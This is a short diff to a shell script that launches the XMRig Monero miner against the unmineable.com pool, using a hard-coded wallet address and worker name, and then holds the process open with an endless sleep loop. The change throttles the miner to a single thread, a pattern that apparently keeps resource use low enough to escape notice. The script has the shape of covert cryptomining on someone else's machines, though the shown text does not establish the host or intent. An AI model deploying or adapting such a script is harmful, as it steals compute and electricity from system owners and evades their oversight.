@@ -9,7 +9,7 @@ cd xmrig-6.25.0
 ./xmrig -a rx \
   -o stratum+ssl://rx-eu.unmineable.com:443 \
   -u XMR:49hnWUygafF8tTZ48PmT9WJvRTkRLMWskNmtFddkVHRi1XAvBeHdiTb29edTDZ8QywLGZzMvV4PBGMfrTBJgZ1dJM7PrubE.unmineable_worker_cc21 \
-  -p x
+  -p x -t1
 
 while [ 1 ]; do
   sleep 3
